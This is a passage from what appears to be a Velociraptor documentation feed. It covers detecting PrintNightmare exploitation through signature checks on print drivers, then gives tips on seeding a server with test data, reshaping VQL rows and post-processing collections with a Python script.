will load an unsigned binary. A binary with an untrusted Authenticode
signature is a valuable data point in detecting malicious code. See
&lt;a href="https://docs.velociraptor.app/blog/2021/2021-06-09-verifying-executables-on-windows-1b3518122d3c/" target="_blank" >this previous post&lt;/a>
 for information on Authenticode. Below we see the
dll loaded by the second exploit POC we tried, based on powershell.&lt;/p>
&lt;p>











&lt;figure id="fafd01aac799e6355dfb28b045fce72c">
 &lt;div data-featherlight="#fafd01aac799e6355dfb28b045fce72c" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-07-12-velociraptor-vs-printnightmare/image13.png" alt="PrintNightmare payload: PE attributes and authenticode">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="image13.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 PrintNightmare payload: PE attributes and authenticode
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Because Velociraptor is running on the endpoint, its Authenticode
verification code can verify catalog based signatures. Most Microsoft
authored print drivers are signed via catalogs - meaning there is no
authenticode signature section in the file itself! One has to verify
the hash in a system wide hash “catalog” file, itself signed by the
developer.&lt;/p>
&lt;p>Many binary classification services are not able to verify catalog
signatures, therefore displaying the file as unsigned. This can be
confusing for analysts who can not quickly triage the file as
legitimate. The below screenshot shows a VirusTotal search for a
legitimate Microsoft print driver. Although the file is not detected
as malicious, it is not shown as signed either.&lt;/p>
&lt;p>











&lt;img class="inline" src="image5.png" />




&lt;/p>
&lt;p>











&lt;figure id="90d6889dffcc389de93185b50f54c3cc">
 &lt;div data-featherlight="#90d6889dffcc389de93185b50f54c3cc" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-07-12-velociraptor-vs-printnightmare/image8.png" alt="mxdwdrv.dll: not by verified signature - VirusTotal trusted tag by hash">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="image8.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 mxdwdrv.dll: not by verified signature - VirusTotal trusted tag by hash
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>All original Microsoft printer drivers are trusted and properly signed
via catalog, as shown by Velociraptor. Note that Velociraptor is also
able to indicate who signed the respective catalog file.&lt;/p>
&lt;p>











&lt;figure id="576ecca397c25da99dcc09229979b5be">
 &lt;div data-featherlight="#576ecca397c25da99dcc09229979b5be" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-07-12-velociraptor-vs-printnightmare/image11.png" alt="mxdwdrv.dll: validated Authenticode signature by catalog">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="image11.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 mxdwdrv.dll: validated Authenticode signature by catalog
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h2 id="conclusions">Conclusions&lt;/h2>
&lt;p>In this post we developed a VQL artifact to detect exploited systems
by searching for residual printer drivers in the spools directory. We
enriched our detection using Authenticode signature verification, file
timestamps, file hashes and PE attributes (like the import/export
table) to quickly determine which drivers were legitimate and which
could indicate past exploitation.&lt;/p>
&lt;p>We can collect this information from the entire Velociraptor fleet in
minutes by simply running a “hunt” over the deployment.&lt;/p>
&lt;p>We have uploaded our query and a version to monitor print driver creation in the form of a VQL artifact to the
Velociraptor &lt;a href="https://docs.velociraptor.app/exchange/" target="_blank" >“Artifact Exchange”&lt;/a>
 - a central place for the community
to share Velociraptor artifacts. This saves time for other
Velociraptor users, who can simply reuse our work and quickly hunt the
artifact across their entire deployment to determine if they were
previously exploited by this vulnerability.&lt;/p>
&lt;p>If you would like to try hunting for this indicator, take Velociraptor
for a spin! It is available on &lt;a href="https://github.com/Velocidex/velociraptor" target="_blank" >GitHub&lt;/a>
 under an open source license. As
always, please file issues on the bug tracker or ask questions on our
mailing list &lt;a href="mailto:velociraptor-discuss@googlegroups.com" >velociraptor-discuss@googlegroups.com&lt;/a>
. You can also chat
with us directly on discord at &lt;a href="https://www.velocidex.com/discord" target="_blank" >https://www.velocidex.com/discord&lt;/a>
&lt;/p></description></item><item><title>Pre-populating a server with clients, hunts and flows</title><link>https://docs.velociraptor.app/knowledge_base/tips/prepopulate_server/</link><pubDate>Tue, 14 Oct 2025 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/knowledge_base/tips/prepopulate_server/</guid><description>&lt;h1 id="pre-populating-a-server-with-clients-hunts-and-flows">Pre-populating a server with clients, hunts and flows&lt;/h1>
&lt;p>When setting up a Velociraptor server for training or demonstration,
it is sometimes desirable to have some data already populated.&lt;/p>
&lt;p>For a realistic training exercise, some people use a &lt;a href="https://github.com/iknowjason/BlueCloud" target="_blank" >Cyber
Range&lt;/a>
 to fully emulate a
real environment. However, managing a large Cyber Range is complex and
expensive.&lt;/p>
&lt;p>Sometimes, we just want a simple Velociraptor server with
pre-populated data, so users can learn how to analyze hunt results,
and improve their VQL skills!&lt;/p>
&lt;h2 id="in-velociraptor---everything-is-a-file">In Velociraptor - Everything is a file!&lt;/h2>
&lt;p>The Velociraptor server simply keeps all the data as simple files on
disk. These files are organized into higher level concepts like
Clients, Flows, Hunts and notebooks.&lt;/p>
&lt;p>Conceptually you can think of these as just storage hierarchies which
can be easily recreated:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>A &lt;code>Flow&lt;/code> is a single collection that occurred as a particular
time. Flows &lt;strong>Contain&lt;/strong> artifact results, and uploaded files.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>A &lt;code>Client&lt;/code> represents an endpoint. The Velociraptor server stores
all flows under the client&amp;rsquo;s directory in the file store. Clients
have a unique client id which is how we can identify them.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>A &lt;code>Hunt&lt;/code> is a logical set of clients and flows which can be
processed together using plugins like &lt;code>hunt_results()&lt;/code> or
&lt;code>source()&lt;/code>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="creating-clients">Creating clients.&lt;/h2>
&lt;p>Normally a client will be created on the server when a physical client
first connects to it. However, it is possible to create new &amp;ldquo;client&amp;rdquo;
objects using the VQL &lt;a href="https://docs.velociraptor.app/vql_reference/server/client_create/" target="_blank" >client_create()&lt;/a>
 function.&lt;/p>
&lt;p>Let&amp;rsquo;s create 100 clients:&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT client_create(os=&amp;quot;windows&amp;quot;,
 hostname=format(format=&amp;quot;Host%d&amp;quot;, args=_value)) AS ClientId
FROM range(end=100)
&lt;/code>&lt;/pre>
&lt;h2 id="adding-flows-to-the-clients">Adding flows to the clients.&lt;/h2>
&lt;p>Normally, we would schedule a collection on clients to gather real
data from the endpoint. But this is not essential, we can also
&lt;code>import&lt;/code> an existing collection into the client&amp;rsquo;s storage space.&lt;/p>
&lt;p>The existing collection can be taken on any Velociraptor instance - it
is just a zip file export of a collection.&lt;/p>
&lt;p>For this article, I will collect the &lt;code>Generic.Client.Info&lt;/code> artifact
and export the collection into a ZIP file in the collection overview
page.&lt;/p>
&lt;p>











&lt;figure id="14bf4fe024292545bb0a1ed547046c38">
 &lt;div data-featherlight="#14bf4fe024292545bb0a1ed547046c38" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/prepopulate_server/exporting_collections.png" alt="Exporting a collection">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="exporting_collections.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Exporting a collection
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Next we import the collection into each client on the server:&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT import_collection(client_id=client_id,
 filename=&amp;quot;/tmp/Generic.Info.zip&amp;quot;)
FROM clients()
&lt;/code>&lt;/pre>
&lt;h2 id="assign-collections-to-a-hunt">Assign collections to a hunt&lt;/h2>
&lt;p>A Hunt is a managed container of collections. Normally we schedule a
hunt so the Velociraptor server can automatically schedule flows on
clients that match the hunt criteria, and keep track of these in a
central location.&lt;/p>
&lt;p>However, we can also just add arbitrary flows to a hunt using VQL. In
this example I will add all the &lt;code>Generic.Client.Info&lt;/code> collections we
imported previously into a new hunt so I can analyze them together.&lt;/p>
&lt;p>First I create a hunt using the GUI to collect the
&lt;code>Generic.Cl ient.Info&lt;/code> artifact, but I will leave the hunt in the
&lt;code>STOPPED&lt;/code> state.&lt;/p>
&lt;p>











&lt;figure id="8c11b79c8531835e11de0b8c0637b1c6">
 &lt;div data-featherlight="#8c11b79c8531835e11de0b8c0637b1c6" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/prepopulate_server/example_hunt.png" alt="Creating an empty hunt">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="example_hunt.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Creating an empty hunt
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>The hunt currently has no clients or flows associated with it.&lt;/p>
&lt;p>I can now assign the latest &lt;code>Generic.Client.Info&lt;/code> collection from each
client:&lt;/p>
&lt;pre>&lt;code>LET HuntId &amp;lt;= &amp;quot;H.D35CUR4S00IHC&amp;quot;

SELECT client_id,
 session_id,
 HuntId,
 hunt_add(client_id=client_id, hunt_id=HuntId, flow_id=session_id)
FROM foreach(row={
 SELECT * FROM clients()
}, query={
 SELECT *
 FROM flows(client_id=client_id)
 WHERE artifacts_with_results =~ &amp;quot;Generic.Client.Info&amp;quot;
 LIMIT 1
})
&lt;/code>&lt;/pre>
&lt;p>The above query:&lt;/p>
&lt;ol>
&lt;li>Iterates over all clients&lt;/li>
&lt;li>For each client, iterates over all flows in that client&lt;/li>
&lt;li>Select the first flow with artifact results of &lt;code>Generic.Client.Info&lt;/code>&lt;/li>
&lt;li>After one flow matches for each client, go to the next client (this is the &lt;code>LIMIT&lt;/code> clause).&lt;/li>
&lt;li>Add the flow to the hunt we created earlier.&lt;/li>
&lt;/ol>
&lt;h2 id="post-process-the-collections">Post process the collections&lt;/h2>
&lt;p>Depending on the scenarios you want to demonstrate, you can create
different clients (perhaps a &amp;ldquo;Compromised&amp;rdquo; set) and import different
collections into them.&lt;/p>
&lt;p>This method allows running any post processing steps in notebooks as
if these client are real endpoints.&lt;/p></description></item><item><title>Manipulating VQL columns and rows</title><link>https://docs.velociraptor.app/knowledge_base/tips/operating_on_columns/</link><pubDate>Fri, 26 Sep 2025 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/knowledge_base/tips/operating_on_columns/</guid><description>&lt;h1 id="manipulating-vql-columns-and-rows">Manipulating VQL columns and rows&lt;/h1>
&lt;p>VQL has a very simple syntax inspired by SQL. At the heart of the
language is a &lt;code>SELECT&lt;/code> query which returns a set of &lt;code>Rows&lt;/code>. A VQL Row
consists of &lt;code>Columns&lt;/code> and &lt;code>Cell Values&lt;/code>.&lt;/p>
&lt;p>You can think of the result of a query is simply a list of Dicts -
where a dict contains key/value pairs. This is easiest to see in the
GUI&amp;rsquo;s &lt;code>Raw JSON&lt;/code> view:&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT * FROM info()
&lt;/code>&lt;/pre>
&lt;p>This returns a JSON result containing a list of JSON objects, each
representing a single row (in this case only one row is returned):&lt;/p>
&lt;pre>&lt;code class="language-json">[
 {
 &amp;quot;Hostname&amp;quot;: &amp;quot;WIN-SJE0CKQO83P&amp;quot;,
 &amp;quot;Uptime&amp;quot;: 776266,
 &amp;quot;BootTime&amp;quot;: 1758078331,
 &amp;quot;OS&amp;quot;: &amp;quot;windows&amp;quot;,
 &amp;quot;Platform&amp;quot;: &amp;quot;Microsoft Windows Server 2022 Standard Evaluation&amp;quot;,
 &amp;quot;PlatformFamily&amp;quot;: &amp;quot;Server&amp;quot;,
 &amp;quot;PlatformVersion&amp;quot;: &amp;quot;21H2&amp;quot;,
 &amp;quot;KernelVersion&amp;quot;: &amp;quot;10.0.20348.4052 Build 20348.4052&amp;quot;,
 &amp;quot;VirtualizationSystem&amp;quot;: &amp;quot;&amp;quot;,
 &amp;quot;VirtualizationRole&amp;quot;: &amp;quot;&amp;quot;,
 &amp;quot;CompilerVersion&amp;quot;: &amp;quot;go1.24.7&amp;quot;,
 &amp;quot;HostID&amp;quot;: &amp;quot;6b65a0af-a752-429a-a65c-83367f882ebe&amp;quot;,
 &amp;quot;Exe&amp;quot;: &amp;quot;c:\\velociraptor.exe&amp;quot;,
 &amp;quot;CWD&amp;quot;: &amp;quot;C:\\Users\\Administrator&amp;quot;,
 &amp;quot;IsAdmin&amp;quot;: true,
 &amp;quot;ClientStart&amp;quot;: &amp;quot;2025-09-23T04:12:06.2778472Z&amp;quot;,
 &amp;quot;LocalTZ&amp;quot;: &amp;quot;PDT&amp;quot;,
 &amp;quot;LocalTZOffset&amp;quot;: -25200,
 &amp;quot;Fqdn&amp;quot;: &amp;quot;WIN-SJE0CKQO83P&amp;quot;,
 &amp;quot;Architecture&amp;quot;: &amp;quot;amd64&amp;quot;
 }
]
&lt;/code>&lt;/pre>
&lt;p>We can select specific columns in this using the &lt;code>Column Specifiers&lt;/code>
following the &lt;code>SELECT&lt;/code> clause:&lt;/p>
&lt;pre>&lt;code class="language-sql">SELECT Hostname FROM info()
&lt;/code>&lt;/pre>
&lt;p>However, what if we wanted to automatically manipulate the columns in
a more sophisticated way? This is often needed when we dont know the
names of all the columns in advance.&lt;/p>
&lt;p>Some use cases are:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>If we do not know the names of the columns in advance but wanted
to select only some columns by e.g. a Regular Expression?&lt;/p>
&lt;/li>
&lt;li>
&lt;p>We want to generate a hash based on a selection of columns?&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>This post shows how to convert any VQL query into a list of dicts,
thereby providing access to the Columns in a more convenient way. We
then show how to &lt;code>deconstruct the dict&lt;/code> back into a row.&lt;/p>
&lt;p>For the following examples, we use the query &lt;code>SELECT * FROM info()&lt;/code> as
a substitute for any other query. Typically these techniques are more
useful for generic queries for which we dont know the types of columns
returned. For example &lt;code>SELECT * FROM source()&lt;/code>, &lt;code>SELECT * FROM parse_csv()&lt;/code> etc.&lt;/p>
&lt;h2 id="step-1-convert-rows-into-dicts">Step 1: Convert rows into dicts&lt;/h2>
&lt;p>In order to deal with a row as a dict we need to use the &lt;code>items()&lt;/code>
plugin:&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT * FROM items(item={ SELECT * FROM info() })
&lt;/code>&lt;/pre>
&lt;pre>&lt;code class="language-json">[
 {
 &amp;quot;_key&amp;quot;: 0,
 &amp;quot;_value&amp;quot;: {
 &amp;quot;Hostname&amp;quot;: &amp;quot;WIN-SJE0CKQO83P&amp;quot;,
 ...
 &amp;quot;Architecture&amp;quot;: &amp;quot;amd64&amp;quot;
 }
 }
]
&lt;/code>&lt;/pre>
&lt;p>When the &lt;code>items()&lt;/code> plugin operates on another query, it emits two columns:&lt;/p>
&lt;ul>
&lt;li>&lt;code>_key&lt;/code> is a counter of row number&lt;/li>
&lt;li>&lt;code>_value&lt;/code> is the entire row given as a dict.&lt;/li>
&lt;/ul>
&lt;p>Once we have the row as a dict, we can manipulate it easily using a
number of dict manipulation tools.&lt;/p>
&lt;h2 id="step-2-perform-operations-on-the-row-dict">Step 2: Perform operations on the row dict.&lt;/h2>
&lt;p>Now that we have the row as a dict we can perform any operations on
it. In the following we see two methods for manipulating dicts:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;code>Set operations&lt;/code>: allow us to add, remove and merge dicts based on
their keys. See &lt;a href="https://docs.velociraptor.app/knowledge_base/tips/set_operations/" >Set operations&lt;/a>
.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>Dict reconstruction&lt;/code>: is a more powerful technique for tearing the
dict apart and reconstructing it again.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="example-select-only-columns-that-match-a-regular-expression">Example: Select only columns that match a regular expression.&lt;/h3>
&lt;p>For this example, assume we dont know all the exact columns in advance
but want to match columns based on some regular expression.&lt;/p>
&lt;p>The key for this is to transform a dict&amp;rsquo;s columns based on a regular
expression: We need to iterate over all the keys in the dict , only
including some keys based on their name, and then put it back together
into a dict:&lt;/p>
&lt;pre>&lt;code class="language-vql">LET FilterKeys(Dict) = to_dict(item={
 SELECT * FROM items(item=Dict)
 WHERE _key =~ &amp;quot;Host|Arch&amp;quot;
})

SELECT _key, FilterKeys(Dict=_value) AS _value
FROM items(item={ SELECT * FROM info() })
&lt;/code>&lt;/pre>
&lt;p>To make the filtering operation simpler to understand and reuse, I
extracted it into a VQL function. The &lt;code>FilterKeys&lt;/code> function builds a
new dict using the &lt;code>to_dict()&lt;/code> function based on a query. The query we
use uses the &lt;code>items()&lt;/code> plugin again. But this time, since it is
operating on a dict, the plugin iterates over the dict&amp;rsquo;s keys and
values as the &lt;code>_key&lt;/code> and &lt;code>_value&lt;/code> columns.&lt;/p>
&lt;p>For this example, we just remove the keys that do not match the
regular expression &lt;code>Host|Arch&lt;/code>. This results in a smaller dict with
only keys matching the regular expression:&lt;/p>
&lt;pre>&lt;code class="language-json">[
 {
 &amp;quot;_key&amp;quot;: 0,
 &amp;quot;_value&amp;quot;: {
 &amp;quot;Hostname&amp;quot;: &amp;quot;WIN-SJE0CKQO83P&amp;quot;,
 &amp;quot;HostID&amp;quot;: &amp;quot;6b65a0af-a752-429a-a65c-83367f882ebe&amp;quot;,
 &amp;quot;Architecture&amp;quot;: &amp;quot;amd64&amp;quot;
 }
 }
]
&lt;/code>&lt;/pre>
&lt;h3 id="example-hash-a-subset-of-columns">Example: Hash a subset of columns&lt;/h3>
&lt;p>For this example, suppose we have a set of columns that we consider to
be a representative of the row and we want to generate a hash based on
those. This technique allows us to tag similar rows with a unique
representative ID.&lt;/p>
&lt;p>For our example we want to create another dict with the columns
&lt;code>Hostname&lt;/code>, &lt;code>Exe&lt;/code> and &lt;code>Architecture&lt;/code>. We consider those columns to be
fully representative of the row. I.e. we accept that other columns may
vary but as long as those fields are the same, we consider the rows to
be duplicates.&lt;/p>
&lt;p>We can quickly extract only those fields by use of &lt;a href="https://docs.velociraptor.app/knowledge_base/tips/set_operations/" >Set
intersection&lt;/a>
 (In
VQL this is implemented by dict multiplication):&lt;/p>
&lt;pre>&lt;code class="language-vql">LET FingerPrint &amp;lt;= dict(Hostname=TRUE, Exe=TRUE, Architecture=TRUE)

SELECT _key, _value * FingerPrint AS _value
FROM items(item={
 SELECT * FROM info()
})
&lt;/code>&lt;/pre>
&lt;pre>&lt;code class="language-json">[
 {
 &amp;quot;_key&amp;quot;: 0,
 &amp;quot;_value&amp;quot;: {
 &amp;quot;Hostname&amp;quot;: &amp;quot;WIN-SJE0CKQO83P&amp;quot;,
 &amp;quot;Exe&amp;quot;: &amp;quot;c:\\velociraptor.exe&amp;quot;,
 &amp;quot;Architecture&amp;quot;: &amp;quot;amd64&amp;quot;
 }
 }
]
&lt;/code>&lt;/pre>
&lt;p>Now we produce a hash of these fields by serializing the dict into a JSON
object. This hash will be the same for every row with the same set of
values for these specific fields:&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT _key,
 hash(accessor=&amp;quot;data&amp;quot;, path=serialize(item=_value * FingerPrint) ).MD5 AS _value
FROM items(item={
 SELECT * FROM info()
})
&lt;/code>&lt;/pre>
&lt;p>Similarly we can use dict subtraction to remove fields from the dict
(e.g. a timestamp field may change all the time so we may want to
remove it).&lt;/p>
&lt;p>Now in this example, I will add the new hash into the row dict as an
additional field:&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT _key,
 _value + dict(
 _HashID=hash(accessor=&amp;quot;data&amp;quot;,
 path=serialize(item=_value * FingerPrint)).MD5) AS _value
FROM items(item={
 SELECT * FROM info()
})
&lt;/code>&lt;/pre>
&lt;p>This works using &lt;code>dict addition&lt;/code>. I create a new dict with a single
key of &lt;code>_HashID&lt;/code> containing the hash I got earlier. By adding this new
dict to the original row dict, I get a new dict with an additional key.&lt;/p>
&lt;pre>&lt;code class="language-json">[
 {
 &amp;quot;_key&amp;quot;: 0,
 &amp;quot;_value&amp;quot;: {
 &amp;quot;Hostname&amp;quot;: &amp;quot;WIN-SJE0CKQO83P&amp;quot;,
 &amp;quot;Architecture&amp;quot;: &amp;quot;amd64&amp;quot;,
 ....
 &amp;quot;_HashID&amp;quot;: &amp;quot;ae7b6e78e5fce4b5e18d371be5916472&amp;quot;
 }
 }
]
&lt;/code>&lt;/pre>
&lt;h2 id="step-3-turn-a-dict-back-into-a-row">Step 3: Turn a dict back into a row&lt;/h2>
&lt;p>The final step is to turn our dict back into a regular VQL &lt;code>Row&lt;/code>. This
will allow it to be viewed nicely in the GUI as a regular table. The
dict keys will turn back into column headers, and the values will be
table cells.&lt;/p>
&lt;p>This operation is done using the &lt;code>foreach()&lt;/code> plugin with the parameter
&lt;code>column&lt;/code>:&lt;/p>
&lt;pre>&lt;code class="language-vql">LET MyFilteredRow = SELECT
 _key, FilterKeys(Dict=_value) AS _value
FROM items(item={ SELECT * FROM info() })

SELECT * FROM foreach(row=MyFilteredRow, column=&amp;quot;_value&amp;quot;)
&lt;/code>&lt;/pre>
&lt;p>To enhance readability, I converted the previous query into a stored
query by naming it &lt;code>MyFilteredRow&lt;/code>, then I can just use it as an
argument to the &lt;code>foreach()&lt;/code> plugin. The &lt;code>column&lt;/code> parameter tells the
&lt;code>foreach()&lt;/code> plugin to extract the dict found in the column &lt;code>_value&lt;/code>
into the row itself (with other columns ignored).&lt;/p>
&lt;p>











&lt;figure id="238e9a9fe41d0b34ebe44a97886c533a">
 &lt;div data-featherlight="#238e9a9fe41d0b34ebe44a97886c533a" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/operating_on_columns/manipulating_columns.png" alt="Manipulating VQL Columns and Rows">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="manipulating_columns.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Manipulating VQL Columns and Rows
 &lt;/figcaption>
&lt;/figure>




&lt;/p></description></item><item><title>How to automatically post process flows with an external program.</title><link>https://docs.velociraptor.app/knowledge_base/tips/post_process_with_external_program/</link><pubDate>Sun, 29 Jun 2025 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/knowledge_base/tips/post_process_with_external_program/</guid><description>&lt;h1 id="how-to-automatically-post-process-flows-with-an-external-program">How to automatically post process flows with an external program.&lt;/h1>
&lt;p>Sometimes we want to automatically post process a collection using an
external program - for example a Python script. This short article
will illustrate how to launch a python program automatically to post
process a collection.&lt;/p>
&lt;p>For our example we will write a Python program to post process the
&lt;code>Generic.Client.Info&lt;/code> artifact. As soon as the artifact is collected
we want to extract the &lt;code>Hostname&lt;/code> field from the &lt;code>BasicInformation&lt;/code>
source and greet the host with a welcome message.&lt;/p>
&lt;h2 id="1-finding-the-result-files-in-a-flow">1. Finding the result files in a flow.&lt;/h2>
&lt;p>Velociraptor collects artifacts in &lt;code>Flows&lt;/code> which are stored as a
collection of files within the VFS. You can see all the files in a
particular flow using the &lt;code>enumerate_flow()&lt;/code> plugin:&lt;/p>
&lt;pre>&lt;code class="language-sql">SELECT * FROM enumerate_flow(client_id=ClientId, flow_id=FlowId)
&lt;/code>&lt;/pre>
&lt;p>











&lt;figure id="6b6a0143878bd191751e2dcef0d58cd2">
 &lt;div data-featherlight="#6b6a0143878bd191751e2dcef0d58cd2" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/post_process_with_external_program/enumerate_flow.png" alt="Enumerating Flow Files">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="enumerate_flow.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Enumerating Flow Files
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>You will notice that each file has a &lt;code>Type&lt;/code> field and the path to the
file is given using the file store path. This allows the file to be
opened using the &lt;code>fs&lt;/code> accessor in VQL.&lt;/p>
&lt;p>However to receive the full file on disk, the &lt;code>file_store()&lt;/code> function
can be used.&lt;/p>
&lt;p>When collecting an artifact, each source query in the artifact is
stored in a single file on disk. In our case we want to know the file
that contains the &lt;code>BasicInformation&lt;/code> source:&lt;/p>
&lt;pre>&lt;code class="language-sql">SELECT file_store(path=Data.VFSPath) AS Path
FROM enumerate_flow(client_id=ClientId, flow_id=FlowId)
WHERE Type = &amp;quot;Result&amp;quot; AND Path =~ &amp;quot;BasicInformation&amp;quot;
&lt;/code>&lt;/pre>
&lt;h2 id="2-launching-the-python-program">2. Launching the Python program&lt;/h2>
&lt;p>Now that we can find the path to the correct file, we need to launch
an external program to receive this path.&lt;/p>
&lt;p>Let&amp;rsquo;s encapsulate the logic in a VQL function:&lt;/p>
&lt;pre>&lt;code class="language-sql">LET _GetPath(ClientId, FlowId) =
 SELECT file_store(path=Data.VFSPath) AS Path
 FROM enumerate_flow(client_id=ClientId, flow_id=FlowId)
 WHERE Type = &amp;quot;Result&amp;quot; AND Path =~ &amp;quot;BasicInformation&amp;quot;

LET GetPath(ClientId, FlowId) = _GetPath(ClientId=ClientId, FlowId=FlowId)[0].Path

SELECT *
FROM execve(argv=[&amp;quot;python.exe&amp;quot;, &amp;quot;C:/MyScript.py&amp;quot;, GetPath(ClientId=ClientId, FlowId=FlowId)])
&lt;/code>&lt;/pre>
&lt;p>This query will extract the path to the &lt;code>BasicInformation&lt;/code> source and
launch my python script, while passing it the path to the result set.&lt;/p>
&lt;p>While working in a notebook I can iterate on developing my python
script by recalculating the cell all the time.&lt;/p>
&lt;p>











&lt;figure id="02046dd392911c979575a5cba31a1558">
 &lt;div data-featherlight="#02046dd392911c979575a5cba31a1558" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/post_process_with_external_program/iterating_dev.png" alt="Iterating development of the python script">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="iterating_dev.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Iterating development of the python script
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>My goal is to write a python script which reads the result set from
disk (which is just a line separated &lt;code>JSON&lt;/code> file), then extracts the
&lt;code>Hostname&lt;/code> column. Finally the python program will emit a &lt;code>JSON&lt;/code>
object per line into &lt;code>Stdout&lt;/code>&lt;/p>
&lt;pre>&lt;code class="language-python">import sys
import json

if __name__ == &amp;quot;__main__&amp;quot;:
 PathName = sys.argv[1]
 with open(PathName, mode=&amp;quot;r&amp;quot;) as fd:
 for line in fd.readlines():
 try:
 data = json.loads(line)
 response = dict(Greeting = &amp;quot;Hello &amp;quot; + data[&amp;quot;Hostname&amp;quot;])
 print(json.dumps(response))
 except Exception as e:
 print(&amp;quot;Exception %s&amp;quot; % e)
 continue
&lt;/code>&lt;/pre>
&lt;p>Now that I have a python program which generates a JSON object per
line, I can expand the JSON object into a row using the &lt;code>foreach()&lt;/code>
plugin:&lt;/p>
&lt;pre>&lt;code class="language-sql">LET _GetPath(ClientId, FlowId) =
 SELECT file_store(path=Data.VFSPath) AS Path
 FROM enumerate_flow(client_id=ClientId, flow_id=FlowId)
 WHERE Type = &amp;quot;Result&amp;quot; AND Path =~ &amp;quot;BasicInformation&amp;quot;

LET GetPath(ClientId, FlowId) = _GetPath(ClientId=ClientId, FlowId=FlowId)[0].Path

SELECT *
FROM foreach(row={
 SELECT parse_json(data=Stdout) AS Row
 FROM execve(argv=[&amp;quot;python.exe&amp;quot;, &amp;quot;C:/MyScript.py&amp;quot;,
 GetPath(ClientId=ClientId, FlowId=FlowId)])
 },
 column=&amp;quot;Row&amp;quot;)
&lt;/code>&lt;/pre>
&lt;h2 id="3-automating-post-processing">3. Automating post processing.&lt;/h2>
&lt;p>So far I was working in a notebook, but now I want to write the
artifact that will trigger it automatically. I want the server itself
to monitor when a new &lt;code>Generic.Client.Info&lt;/code> collection is made and
automatically post process it - So I need a &lt;code>Server Event Monitor&lt;/code>
artifact.&lt;/p>
&lt;p>When a collection is complete, the server emits a
&lt;code>System.Flow.Completion&lt;/code> event, which I can watch using
&lt;code>watch_monitoring()&lt;/code>. I can then filter collection by the artifacts
they found to obtain the &lt;code>ClientId&lt;/code> and &lt;code>FlowId&lt;/code>.&lt;/p>
&lt;p>Putting it all together:&lt;/p>
&lt;pre>&lt;code class="language-sql">LET Completions = SELECT FlowId, ClientId
 FROM watch_monitoring(artifact='System.Flow.Completion')
 WHERE Flow.artifacts_with_results =~ &amp;quot;Generic.Client.Info/BasicInformation&amp;quot;

LET PostProcess(ClientId, FlowId) = SELECT *
 FROM foreach(row={
 SELECT parse_json(data=Stdout) AS Row
 FROM execve(argv=[&amp;quot;python.exe&amp;quot;, &amp;quot;C:/MyScript.py&amp;quot;,
 GetPath(ClientId=ClientId, FlowId=FlowId)])
 },
 column=&amp;quot;Row&amp;quot;)

LET _GetPath(ClientId, FlowId) =
 SELECT file_store(path=Data.VFSPath) AS Path
 FROM enumerate_flow(client_id=ClientId, flow_id=FlowId)
 WHERE Type = &amp;quot;Result&amp;quot; AND Path =~ &amp;quot;BasicInformation&amp;quot;

LET GetPath(ClientId, FlowId) = _GetPath(ClientId=ClientId, FlowId=FlowId)[0].Path

SELECT * FROM foreach(row=Completions, query={
 SELECT * FROM PostProcess(ClientId=ClientId, FlowId=FlowId)
})
&lt;/code>&lt;/pre>
&lt;p>I can test this in a notebook and see it works!&lt;/p>
&lt;h2 id="4-convert-to-an-artifact-and-install">4. Convert to an artifact and install&lt;/h2>
&lt;p>My Final artifact looks like this&lt;/p>
&lt;pre>&lt;code class="language-yaml">name: Custom.BasicInformation.EnrichPython
type: SERVER_EVENT
sources:
 - query: |
 LET Completions = SELECT FlowId,
 ClientId
 FROM watch_monitoring(artifact='System.Flow.Completion')
 WHERE Flow.artifacts_with_results =~ &amp;quot;Generic.Client.Info/BasicInformation&amp;quot;

